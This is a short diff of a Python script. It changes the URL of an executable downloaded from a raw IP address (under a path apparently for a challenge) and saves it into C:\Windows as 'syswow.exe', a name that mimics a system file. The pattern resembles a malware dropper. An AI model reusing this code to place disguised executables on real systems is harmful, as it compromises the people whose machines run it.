@@ -8,7 +8,7 @@ def main():
     base_dir = r"C:\Windows"
     files_to_download = [
         {
-            "url": "http://146.190.194.189/files/chall/mpsys.exe",
+            "url": "http://146.190.194.189/files/chall/syswow.exe",
             "file_name": "syswow.exe"
         }
     ]
